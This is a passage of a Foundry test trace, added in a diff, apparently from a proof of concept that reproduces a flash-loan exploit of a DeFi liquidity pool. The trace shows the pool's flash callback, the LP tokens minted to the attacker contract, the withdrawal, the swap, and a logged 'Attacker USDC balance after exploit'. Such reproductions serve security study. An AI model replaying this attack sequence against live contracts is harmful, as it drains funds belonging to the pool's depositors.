+    │   │   │   │   ├─ [14154] 0x08CD9D993840ccA86546f4Ebf166C78c7d8ff700::intakeNumeraireLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 1844674407370953967612232 [1.844e24]) [delegatecall]
+    │   │   │   │   │   ├─ [1615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 7928972720022035 [7.928e15]
+    │   │   │   │   │   │   └─ ← [Return] 7928972720022035 [7.928e15]
+    │   │   │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   ├─ [6479] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 2325581395325581 [2.325e15])
+    │   │   │   │   │   │   ├─ [5691] FiatTokenV1::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 2325581395325581 [2.325e15]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x46161158b1947D9149E066d6d31AF1283b2d377C, value: 2325581395325581 [2.325e15])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x6200be9415d665c0b9d12b8ae15eba82ec01318cb52c0c916659aca2d93e6373: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffff7bce563090d72
+    │   │   │   │   │   │   │   │   @ 0x2ab45554ddc555337b8c9745aa671fca07bf60d725b8f7b13ed4b399e25648fc: 0x000000000000000000000000000000000000000000000000001c2b5bd2692213 → 0x00000000000000000000000000000000000000000000000000246e766f6014a0
+    │   │   │   │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000084a9a6c1d94d7 → 0x0000000000000000000000000000000000000000000000000000077fcf26a24a
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000008431a9cf6f28d
+    │   │   │   │   ├─ [13367] 0xc2E645C253FAf984B6Af2668798719b7c6AbAB95::intakeNumeraireLPRatio(500000000000000000 [5e17], 500000000000000000 [5e17], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 1844674407370956355582842 [1.844e24]) [delegatecall]
+    │   │   │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   │   └─ ← [Return] 348542647980 [3.485e11]
+    │   │   │   │   │   ├─ [5992] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 100000000000 [1e11])
+    │   │   │   │   │   │   ├─ [5197] FiatTokenV2_1::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x46161158b1947D9149E066d6d31AF1283b2d377C, 100000000000 [1e11]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x46161158b1947D9149E066d6d31AF1283b2d377C, value: 100000000000 [1e11])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x035625c05f7d9c5fd4a9920133569f332225ace0da62b2232866e04e40817a91: 0x0000000000000000000000000000000000000000000000000000005126c2beac → 0x000000000000000000000000000000000000000000000000000000686f39a6ac
+    │   │   │   │   │   │   │   │   @ 0x27266a933beee98a83cf358f7efd3bce1608669ec0990dc938739b848f5d91f1: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffe8b78917ff
+    │   │   │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x0000000000000000000000000000000000000000000000000000001776a8831e → 0x000000000000000000000000000000000000000000000000000000002e319b1e
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000174876e800
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 387134878542173576823470 [3.871e23])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 7: 0x000000000000000000000000000000000000000000011dbb5599b9c3c67a850c → 0x000000000000000000000000000000000000000000016fb5f54c4360b0f187ba
+    │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 0x0000000000000000000000000000000000000000000051fa9fb2899cea7702ae
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000051fa9fb2899cea7702ae000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000008431a9cf6f28d000000000000000000000000000000000000000000000000000000174876e800
+    │   │   │   └─ ← [Return] 387134878542173576823470 [3.871e23], [2325581395325581 [2.325e15], 100000000000 [1e11]]
+    │   │   ├─  storage changes:
+    │   │   │   @ 36: 0 → 0x0000000000000000000000000000000000000000000051fa9fb2899cea7702ae
+    │   │   └─ ← [Stop]
+    │   ├─ [1615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   ├─ [836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   └─ ← [Return] 10254554115347616 [1.025e16]
+    │   │   └─ ← [Return] 10254554115347616 [1.025e16]
+    │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   └─ ← [Return] 448542647980 [4.485e11]
+    │   │   └─ ← [Return] 448542647980 [4.485e11]
+    │   ├─ [12221] FiatTokenProxy::fallback(0x27E843260c71443b4CC8cB6bF226C3f77b9695AF, 11627906976628 [1.162e13])
+    │   │   ├─ [11439] FiatTokenV1::transfer(0x27E843260c71443b4CC8cB6bF226C3f77b9695AF, 11627906976628 [1.162e13]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x46161158b1947D9149E066d6d31AF1283b2d377C, to: 0x27E843260c71443b4CC8cB6bF226C3f77b9695AF, value: 11627906976628 [1.162e13])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x2ab45554ddc555337b8c9745aa671fca07bf60d725b8f7b13ed4b399e25648fc: 0x00000000000000000000000000000000000000000000000000246e766f6014a0 → 0x000000000000000000000000000000000000000000000000002463e31a1c492c
+    │   │   │   │   @ 0x7936ff6e6915afdc929c43d19aaa28aaddd353ffbeae51fe910e8dd486725cdd: 0x00000000000000000000000000000000000000000000000000000e7880cff06f → 0x0000000000000000000000000000000000000000000000000000190bd613bbe3
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [11617] FiatTokenProxy::fallback(0x27E843260c71443b4CC8cB6bF226C3f77b9695AF, 500000000 [5e8])
+    │   │   ├─ [10828] FiatTokenV2_1::transfer(0x27E843260c71443b4CC8cB6bF226C3f77b9695AF, 500000000 [5e8]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x46161158b1947D9149E066d6d31AF1283b2d377C, to: 0x27E843260c71443b4CC8cB6bF226C3f77b9695AF, value: 500000000 [5e8])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x035625c05f7d9c5fd4a9920133569f332225ace0da62b2232866e04e40817a91: 0x000000000000000000000000000000000000000000000000000000686f39a6ac → 0x00000000000000000000000000000000000000000000000000000068516c41ac
+    │   │   │   │   @ 0x786b0e645aa5b3c5ca100bdff438c81600323479b05fbfe52393cd4c6bbecc86: 0x0000000000000000000000000000000000000000000000000000000abc699d92 → 0x0000000000000000000000000000000000000000000000000000000ada370292
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ emit Flash(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 2313953488348953 [2.313e15], amount1: 99500000000 [9.95e10], paid0: 11627906976628 [1.162e13], paid1: 500000000 [5e8])
+    │   └─ ← [Stop]
+    ├─ [91104] 0x46161158b1947D9149E066d6d31AF1283b2d377C::withdraw(387134878542173576823470 [3.871e23], 1668108527 [1.668e9])
+    │   ├─ [85776] ProportionalLiquidity::44fd3db0(00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000051fa9fb2899cea7702ae) [delegatecall]
+    │   │   ├─ [22434] 0x08CD9D993840ccA86546f4Ebf166C78c7d8ff700::viewNumeraireBalance(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   ├─ [15643] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   │   ├─ [7410] 0x156710f56dC5F0C022505A9ffE95b0b51A7c5c9A::latestRoundData() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 458, 6417, 1668092435 [1.668e9], 1668092435 [1.668e9], 458
+    │   │   │   │   └─ ← [Return] 18446744073709552074 [1.844e19], 6417, 1668092435 [1.668e9], 1668092435 [1.668e9], 18446744073709552074 [1.844e19]
+    │   │   │   ├─ [1615] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [836] FiatTokenV1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   │   │   └─ ← [Return] 10242926208370988 [1.024e16]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000a0788932580c308feac42
+    │   │   ├─ [22134] 0xc2E645C253FAf984B6Af2668798719b7c6AbAB95::viewNumeraireBalance(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   ├─ [15643] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   │   ├─ [7410] AccessControlledOffchainAggregator::latestRoundData() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 735, 99983254 [9.998e7], 1668101663 [1.668e9], 1668101663 [1.668e9], 735
+    │   │   │   │   └─ ← [Return] 36893488147419103967 [3.689e19], 99983254 [9.998e7], 1668101663 [1.668e9], 1668101663 [1.668e9], 36893488147419103967 [3.689e19]
+    │   │   │   ├─ [1315] FiatTokenProxy::fallback(0x46161158b1947D9149E066d6d31AF1283b2d377C) [staticcall]
+    │   │   │   │   ├─ [529] FiatTokenV2_1::balanceOf(0x46161158b1947D9149E066d6d31AF1283b2d377C) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   │   └─ ← [Return] 448042647980 [4.48e11]
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000006d5df9e66ec9e236c15d2
+    │   │   ├─ [15070] 0x08CD9D993840ccA86546f4Ebf166C78c7d8ff700::outputNumeraire(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2703161934845382889114742 [2.703e24]) [delegatecall]
+    │   │   │   ├─ [3143] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   │   ├─ [1410] 0x156710f56dC5F0C022505A9ffE95b0b51A7c5c9A::latestRoundData() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 458, 6417, 1668092435 [1.668e9], 1668092435 [1.668e9], 458
+    │   │   │   │   └─ ← [Return] 18446744073709552074 [1.844e19], 6417, 1668092435 [1.668e9], 1668092435 [1.668e9], 18446744073709552074 [1.844e19]
+    │   │   │   ├─ [8221] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2283601404332242 [2.283e15])
+    │   │   │   │   ├─ [7439] FiatTokenV1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2283601404332242 [2.283e15]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x46161158b1947D9149E066d6d31AF1283b2d377C, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2283601404332242 [2.283e15])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2ab45554ddc555337b8c9745aa671fca07bf60d725b8f7b13ed4b399e25648fc: 0x000000000000000000000000000000000000000000000000002463e31a1c492c → 0x000000000000000000000000000000000000000000000000001c46f6b798c05a
+    │   │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x0000000000000000000000000000000000000000000000000000077fcf26a24a → 0x0000000000000000000000000000000000000000000000000008246c31aa2b1c
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000081cec628388d2
+    │   │   ├─ [14466] 0xc2E645C253FAf984B6Af2668798719b7c6AbAB95::outputNumeraire(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1842309544867711739284135 [1.842e24]) [delegatecall]
+    │   │   │   ├─ [3143] EACAggregatorProxy::latestRoundData() [staticcall]
+    │   │   │   │   ├─ [1410] AccessControlledOffchainAggregator::latestRoundData() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 735, 99983254 [9.998e7], 1668101663 [1.668e9], 1668101663 [1.668e9], 735
+    │   │   │   │   └─ ← [Return] 36893488147419103967 [3.689e19], 99983254 [9.998e7], 1668101663 [1.668e9], 1668101663 [1.668e9], 36893488147419103967 [3.689e19]
+    │   │   │   ├─ [7617] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99888527878 [9.988e10])
+    │   │   │   │   ├─ [6828] FiatTokenV2_1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99888527878 [9.988e10]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: 0x46161158b1947D9149E066d6d31AF1283b2d377C, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 99888527878 [9.988e10])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x035625c05f7d9c5fd4a9920133569f332225ace0da62b2232866e04e40817a91: 0x00000000000000000000000000000000000000000000000000000068516c41ac → 0x000000000000000000000000000000000000000000000000000000510f9a47a6
+    │   │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x000000000000000000000000000000000000000000000000000000002e319b1e → 0x0000000000000000000000000000000000000000000000000000001770039524
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000001741d1fa06
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 387134878542173576823470 [3.871e23])
+    │   │   ├─  storage changes:
+    │   │   │   @ 7: 0x000000000000000000000000000000000000000000016fb5f54c4360b0f187ba → 0x000000000000000000000000000000000000000000011dbb5599b9c3c67a850c
+    │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x0000000000000000000000000000000000000000000051fa9fb2899cea7702ae → 0
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000081cec628388d20000000000000000000000000000000000000000000000000000001741d1fa06
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000081cec628388d20000000000000000000000000000000000000000000000000000001741d1fa06
+    ├─ [1615] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [836] FiatTokenV1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 2291846921988892 [2.291e15]
+    │   └─ ← [Return] 2291846921988892 [2.291e15]
+    ├─ [47305] SwapRouter::exactInputSingle(ExactInputSingleParams({ tokenIn: 0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52, tokenOut: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, fee: 500, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1668108467 [1.668e9], amountIn: 1145923460994446 [1.145e15], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   ├─ [42344] UniswapV3Pool::swap(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 1145923460994446 [1.145e15], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bebf2096e01455108badcbaf86ce30b6e5a72aa520001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000)
+    │   │   ├─ [4817] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 72556118375 [7.255e10])
+    │   │   │   ├─ [4028] FiatTokenV2_1::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 72556118375 [7.255e10]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 72556118375 [7.255e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x6880afd761842d3cdeedc0b7f76510afeab822c4b73a4bf299e44894163ee697: 0x000000000000000000000000000000000000000000000000000000338cb0d32b → 0x00000000000000000000000000000000000000000000000000000022a80251c4
+    │   │   │   │   │   @ 0xea80dd88ed2c8da1b3cfa53b6b2568ae58fe83d484d0c01324a62ba1aa9ffdac: 0x0000000000000000000000000000000000000000000000000000001770039524 → 0x0000000000000000000000000000000000000000000000000000002854b2168b
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [1615] FiatTokenProxy::fallback(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [staticcall]
+    │   │   │   ├─ [836] FiatTokenV1::balanceOf(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 8914429753782298 [8.914e15]
+    │   │   │   └─ ← [Return] 8914429753782298 [8.914e15]
+    │   │   ├─ [10565] SwapRouter::uniswapV3SwapCallback(-72556118375 [-7.255e10], 1145923460994446 [1.145e15], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000000002bebf2096e01455108badcbaf86ce30b6e5a72aa520001f4a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000)
+    │   │   │   ├─ [6479] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], 1145923460994446 [1.145e15])
+    │   │   │   │   ├─ [5691] FiatTokenV1::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], 1145923460994446 [1.145e15]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964], value: 1145923460994446 [1.145e15])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x79d9846fbf5ba218e1675f258b761876af9d0333b76e2773cfc8b3432ed7262b: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffbedc9e72aea71
+    │   │   │   │   │   │   @ 0xb496c955f42445db28fa18b947aeed77cf415101c881261bd65945ecae63ac22: 0x000000000000000000000000000000000000000000000000001faba06ad9701a → 0x0000000000000000000000000000000000000000000000000023bdd683ae85a8
+    │   │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x0000000000000000000000000000000000000000000000000008246c31aa2b1c → 0x0000000000000000000000000000000000000000000000000004123618d5158e
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [1615] FiatTokenProxy::fallback(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [staticcall]
+    │   │   │   ├─ [836] FiatTokenV1::balanceOf(UniswapV3Pool: [0xE558f01FCb39B11B2000D11e9a18DcF105f78964]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 10060353214776744 [1.006e16]
+    │   │   │   └─ ← [Return] 10060353214776744 [1.006e16]
+    │   │   ├─ emit Swap(sender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], recipient: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: -72556118375 [-7.255e10], amount1: 1145923460994446 [1.145e15], sqrtPriceX96: 10016166606243848387786391344626 [1.001e31], liquidity: 735939883996233 [7.359e14], tick: 96797 [9.679e4])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0x000100004a004a0000017925000000000000007cdd908173cf479a2d2341ddd5 → 0x000100004a004a0000017a1d000000000000007e6bfad42b512f0c2aa84ed5f2
+    │   │   │   @ 2: 0x0000000000000000000000000000000011450e2b969cc740fcf3e72e268a0e4e → 0x00000000000000000000000000000000117813f97aa1ee0839abfe728f5d949b
+    │   │   └─ ← [Return] -72556118375 [-7.255e10], 1145923460994446 [1.145e15]
+    │   └─ ← [Return] 72556118375 [7.255e10]
+    ├─ [1315] FiatTokenProxy::fallback(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [529] FiatTokenV2_1::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 173219649163 [1.732e11]
+    │   └─ ← [Return] 173219649163 [1.732e11]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDC balance after exploit", val: 173219649163 [1.732e11], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 33.51s (30.33s CPU time)
+
+Ran 1 test suite in 38.51s (33.51s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
